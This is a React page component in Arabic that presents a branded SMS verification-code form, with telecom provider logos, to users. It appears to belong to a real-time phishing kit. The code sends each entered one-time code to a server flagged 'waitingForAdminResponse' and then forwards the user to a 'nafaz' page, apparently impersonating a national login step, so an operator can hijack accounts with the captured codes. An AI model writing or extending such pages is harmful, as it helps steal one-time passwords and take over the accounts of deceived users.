import Main from "@/components/MainWrapper";
import { useEffect, useState } from "react";
import { logo } from "@/real-time/context/signals";
import { ArrowUpRight } from "lucide-react";
import InputWithClearIcon from "@/components/InputWithClearIcon";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import telProviders from "@/data/tel-providers";

function Verify() {
  useEffect(() => {
    setCurrentPage("verify");
  }, []);

  const [error, setError] = useState<{ code: boolean }>({ code: false });

  const sendData = (e: any) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));
    // console.log(data);

    // [ ] should be true for production
    sendDataToServer({
      data: {
        "رمز التحقق": data.code,
      },
      current: "verify",
      nextPage: "nafaz",
      waitingForAdminResponse: true,
    });
  };

  return (
    <Main>
      <div className="bg-gray-100 min-h-screen py-20">
        <form
          className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
          onSubmit={sendData}
        >
          <div className="py-2 px-6 mb-4 rounded-xl bg-main">
            <img
              src="/assets/images/logo.webp"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <img
            src="/assets/images/client/mutasil.png"
            alt="mobile header image"
            className="mb-6 w-1/4"
          />

          <div className="flex gap-2">
            <img
              src="/assets/images/client/mobile.png"
              className="h-12"
              alt="mobile logo"
            />
            <div className="flex gap-1">
              <ArrowUpRight className="cursor-pointer w-6 text-main" />

              <h2 className="mb-8 font-bold text-gray-600">
                تم إرسال رمز التحقق الى هاتفك النقال. الرجاء إدخاله في هذه
                الخانة.
              </h2>
            </div>
          </div>

          <img
            src={
              telProviders.filter((tel) => tel.name === logo?.value)[0]?.logo
            }
            className="h-20 mx-auto -mb-4"
            alt={`${logo?.value} logo`}
          />

          <InputWithClearIcon
            setError={setError}
            id="code"
            label="رمز التحقق:"
            type="password"
            placeholder="أدخل رمز التحقق هنا"
            rtl={true}
            max={6}
          />
          <p className="text-red-500 text-sm h-4">
            {error?.code
              ? "رمز التحقق غير صحيح يجب أن يكون مكون من 4-6 خانات"
              : ""}
          </p>

          <button className="w-fit ms-auto mt-2 lg:text-xl capitalize rounded-3xl font-bold py-1.5 px-10 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400">
            تحقق
          </button>

          <img
            src="/assets/images/client/below-mob-verify.png"
            alt="mobile header image"
            className="mt-6 mx-auto"
          />
        </form>
      </div>
    </Main>
  );
}

export default Verify;
